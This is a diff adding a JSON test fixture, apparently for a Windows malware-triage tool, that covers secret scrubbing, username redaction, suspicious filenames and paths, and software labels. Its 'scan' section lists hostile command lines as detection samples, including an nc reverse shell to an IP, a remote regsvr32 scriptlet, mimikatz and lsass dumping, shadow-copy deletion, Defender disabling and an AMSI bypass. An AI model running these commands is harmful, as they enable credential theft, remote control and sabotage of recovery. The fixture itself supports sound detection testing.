+   "text": "key sk-abcdefghijklmnopqrstuvwxyz012345 and ghp_abcdefghijklmnopqrstuvwx and AKIAABCDEFGHIJKLMNOP",
+   "scrubbed": "key <redacted> and <redacted> and <redacted>"
+  },
+  {
+   "text": "jwt eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.abcdefghijklmnop",
+   "scrubbed": "jwt <redacted>"
+  },
+  {
+   "text": "nothing here",
+   "scrubbed": "nothing here"
+  },
+  {
+   "text": "",
+   "scrubbed": ""
+  }
+ ],
+ "redact": [
+  {
+   "text": "C:\\Users\\jdoe\\x",
+   "redacted": "C:\\Users\\<user>\\x"
+  },
+  {
+   "text": "JDOE and jdoe2 and xjdoe",
+   "redacted": "<user> and jdoe2 and xjdoe"
+  },
+  {
+   "text": "DESKTOP-ABC123\\jdoe",
+   "redacted": "<computer>\\<user>"
+  },
+  {
+   "text": "desktop-abc123",
+   "redacted": "<computer>"
+  },
+  {
+   "text": "S-1-5-21-1-2-3",
+   "redacted": "S-1-5-21-<sid>"
+  },
+  {
+   "text": "S-1-5-21-11-22-33-1001 S-1-5-18",
+   "redacted": "S-1-5-21-<sid>-1001 S-1-5-18"
+  },
+  {
+   "text": "jdoejdoe jdoe",
+   "redacted": "jdoejdoe <user>"
+  }
+ ],
+ "clip": [
+  {
+   "text": "abcdef",
+   "limit": 3,
+   "clipped": "abc… (+3 characters)"
+  },
+  {
+   "text": "abc",
+   "limit": 3,
+   "clipped": "abc"
+  },
+  {
+   "text": "héllo wörld",
+   "limit": 4,
+   "clipped": "héll… (+7 characters)"
+  }
+ ],
+ "names": [
+  {
+   "path": "C:\\Users\\x\\AppData\\Roaming\\svchost.exe",
+   "flags": [
+    "system_impersonation"
+   ],
+   "signed": [
+    "misplaced_windows_binary"
+   ]
+  },
+  {
+   "path": "C:\\Apps\\svch0st.exe",
+   "flags": [
+    "system_lookalike_name"
+   ],
+   "signed": []
+  },
+  {
+   "path": "C:\\Apps\\scvhost.exe",
+   "flags": [
+    "system_lookalike_name"
+   ],
+   "signed": []
+  },
+  {
+   "path": "C:\\Apps\\explore.exe",
+   "flags": [
+    "system_lookalike_name"
+   ],
+   "signed": []
+  },
+  {
+   "path": "C:\\Apps\\explorer++.exe",
+   "flags": [],
+   "signed": []
+  },
+  {
+   "path": "C:\\Users\\x\\Downloads\\invoice.pdf.exe",
+   "flags": [
+    "double_extension"
+   ],
+   "signed": [
+    "double_extension"
+   ]
+  },
+  {
+   "path": "C:\\x\\a3f9c2e17b.exe",
+   "flags": [
+    "random_name"
+   ],
+   "signed": []
+  },
+  {
+   "path": "C:\\x\\x7k2m9q4z.exe",
+   "flags": [
+    "random_name"
+   ],
+   "signed": []
+  },
+  {
+   "path": "C:\\x\\abcd1234.exe",
+   "flags": [
+    "random_name"
+   ],
+   "signed": []
+  },
+  {
+   "path": "C:\\x\\doc‮fdp.exe",
+   "flags": [
+    "reversed_name"
+   ],
+   "signed": [
+    "reversed_name"
+   ]
+  },
+  {
+   "path": "C:\\Windows\\System32\\svchost.exe",
+   "flags": [],
+   "signed": []
+  },
+  {
+   "path": "C:\\Program Files\\WindowsApps\\Microsoft.X\\svchost.exe",
+   "flags": [],
+   "signed": []
+  }
+ ],
+ "locations": [
+  {
+   "path": "C:\\Users\\x\\AppData\\Local\\Temp\\a.exe",
+   "flags": [
+    "path_temp"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\Users\\x\\AppData\\Roaming\\a.exe",
+   "flags": [
+    "path_appdata_root"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\$Recycle.Bin\\S-1-5-21\\a.exe",
+   "flags": [
+    "path_recycle_bin",
+    "path_hidden_root"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\Program Files\\Foo\\foo.exe",
+   "flags": [],
+   "writable": false,
+   "ms_home": true
+  },
+  {
+   "path": "c:\\temp\\x.exe",
+   "flags": [
+    "path_temp"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\x.exe",
+   "flags": [
+    "path_drive_root"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\Windows\\Fonts\\x.exe",
+   "flags": [
+    "path_unusual_windows"
+   ],
+   "writable": false,
+   "ms_home": true
+  },
+  {
+   "path": "C:\\ProgramData\\x.dll",
+   "flags": [
+    "path_programdata_root"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\PerfLogs\\x\\y.exe",
+   "flags": [
+    "path_hidden_root"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\Users\\x\\Desktop\\a.exe",
+   "flags": [
+    "path_desktop"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\file.txt:hidden.exe",
+   "flags": [
+    "alternate_data_stream",
+    "path_drive_root"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\Users\\Public\\x\\y.exe",
+   "flags": [
+    "path_public"
+   ],
+   "writable": true,
+   "ms_home": false
+  },
+  {
+   "path": "C:\\Windows\\Temp\\x.exe",
+   "flags": [
+    "path_temp"
+   ],
+   "writable": true,
+   "ms_home": true
+  },
+  {
+   "path": "C:\\Windows\\System32\\Tasks\\x.exe",
+   "flags": [],
+   "writable": true,
+   "ms_home": true
+  }
+ ],
+ "scan": [
+  {
+   "text": "xmrig.exe -o stratum+tcp://pool.minexmr.com:4444 --donate-level 1",
+   "flags": [
+    "miner"
+   ]
+  },
+  {
+   "text": "vssadmin.exe delete shadows /all /quiet",
+   "flags": [
+    "anti_recovery"
+   ]
+  },
+  {
+   "text": "bcdedit /set {default} recoveryenabled No",
+   "flags": [
+    "anti_recovery"
+   ]
+  },
+  {
+   "text": "wevtutil cl Security",
+   "flags": [
+    "anti_recovery"
+   ]
+  },
+  {
+   "text": "mimikatz sekurlsa::logonpasswords",
+   "flags": [
+    "offensive_tool"
+   ]
+  },
+  {
+   "text": "procdump64.exe -ma lsass.exe out.dmp",
+   "flags": [
+    "offensive_tool"
+   ]
+  },
+  {
+   "text": "rundll32 comsvcs.dll, MiniDump 600 x full",
+   "flags": [
+    "offensive_tool"
+   ]
+  },
+  {
+   "text": "Set-MpPreference -DisableRealtimeMonitoring $true",
+   "flags": [
+    "disables_defenses"
+   ]
+  },
+  {
+   "text": "netsh advfirewall set allprofiles state off",
+   "flags": [
+    "disables_defenses"
+   ]
+  },
+  {
+   "text": "sc stop WinDefend",
+   "flags": [
+    "disables_defenses"
+   ]
+  },
+  {
+   "text": "taskkill /f /im MsMpEng.exe",
+   "flags": [
+    "disables_defenses"
+   ]
+  },
+  {
+   "text": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')",
+   "flags": [
+    "amsi_bypass"
+   ]
+  },
+  {
+   "text": "regsvr32 /s /i:http://203.0.113.7/a.sct scrobj.dll",
+   "flags": [
+    "regsvr32_scriptlet",
+    "remote_scriptlet",
+    "ip_url"
+   ]
+  },
+  {
+   "text": "nc.exe 203.0.113.9 4444 -e cmd.exe",
+   "flags": [
+    "reverse_shell"
+   ]
+  },
+  {
+   "text": "net localgroup Administradores eviluser /add",
+   "flags": [
+    "creates_account"
+   ]
+  },
+  {
+   "text": "mshta vbscript:Execute(\"x\")",
+   "flags": [
+    "remote_mshta"
+   ]
+  },
+  {
+   "text": "rundll32 url.dll,FileProtocolHandler http://x",
+   "flags": [
+    "rundll32_proxy"
+   ]
+  },
+  {
+   "text": "VirtualAlloc WriteProcessMemory",
+   "flags": [
+    "memory_injection"
+   ]
+  },
+  {
+   "text": "GetAsyncKeyState",
+   "flags": [
+    "keylogger"
+   ]
+  },
+  {
+   "text": "certutil -decode a b",
+   "flags": [
+    "certutil_download"
+   ]
+  },
+  {
+   "text": "script:https://203.0.113.4/x.sct",
+   "flags": [
+    "remote_scriptlet",
+    "ip_url"
+   ]
+  },
+  {
+   "text": "bitsadmin /transfer j http://x c:\\x",
+   "flags": [
+    "bitsadmin_download"
+   ]
+  },
+  {
+   "text": "[char]72+[char]101+[char]108+[char]108+[char]111",
+   "flags": [
+    "obfuscation"
+   ]
+  },
+  {
+   "text": "$a -bxor 5",
+   "flags": [
+    "obfuscation"
+   ]
+  },
+  {
+   "text": "c^m^d^.^e^x^e",
+   "flags": []
+  },
+  {
+   "text": "p`o`w`e`r`s`h`e`l`l",
+   "flags": [
+    "obfuscation"
+   ]
+  },
+  {
+   "text": "'a'+'b'+'c'+'d'+'e'+'f'",
+   "flags": [
+    "obfuscation"
+   ]
+  },
+  {
+   "text": "curl.exe -o x https://example.org/a",
+   "flags": [
+    "network_download"
+   ]
+  },
+  {
+   "text": "wget http://example.org",
+   "flags": [
+    "network_download"
+   ]
+  },
+  {
+   "text": "iwr http://10.0.0.1/x then http://192.168.0.1",
+   "flags": [
+    "network_download"
+   ]
+  },
+  {
+   "text": "https://pastebin.com/raw/x",
+   "flags": [
+    "abused_site"
+   ]
+  },
+  {
+   "text": "https://abc.trycloudflare.com",
+   "flags": [
+    "abused_site"
+   ]
+  },
+  {
+   "text": "iex $x",
+   "flags": [
+    "executes_text"
+   ]
+  },
+  {
+   "text": "[Convert]::FromBase64String($s)",
+   "flags": [
+    "base64_execution"
+   ]
+  },
+  {
+   "text": "schtasks /create /tn x /tr y",
+   "flags": [
+    "command_persistence"
+   ]
+  },
+  {
+   "text": "reg add HKCU\\...\\Run /v x",
+   "flags": [
+    "command_persistence"
+   ]
+  },
+  {
+   "text": "Set-ItemProperty HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -Name x",
+   "flags": [
+    "command_persistence"
+   ]
+  }
+ ],
+ "labels": [
+  {
+   "name": "KMSpico 10",
+   "flags": [
+    "piracy_activator"
+   ]
+  },
+  {
+   "name": "AnyDesk",
+   "flags": [
+    "remote_access"
+   ]
+  },
+  {
+   "name": "Driver Booster",
+   "flags": [
+    "pup"
+   ]
+  },
+  {
+   "name": "Python 2.7.18",
+   "flags": []
+  },
+  {
+   "name": "Chrome Remote Desktop Host",
+   "flags": [
+    "remote_access"
+   ]
+  },
+  {
+   "name": "tailscale-ipn",
+   "flags": [
+    "remote_access"
+   ]
+  },
+  {
+   "name": "Acme Editor",
+   "flags": []
+  },
+  {
+   "name": "crack.exe",
+   "flags": [
+    "piracy_activator"
+   ]
+  },
+  {
+   "name": "keygen",
+   "flags": [
+    "piracy_activator"
+   ]
+  },
+  {
+   "name": "cloudflared",
+   "flags": [
+    "remote_access"
+   ]
+  },
+  {
+   "name": "",
+   "flags": []
+  }
+ ]
+}
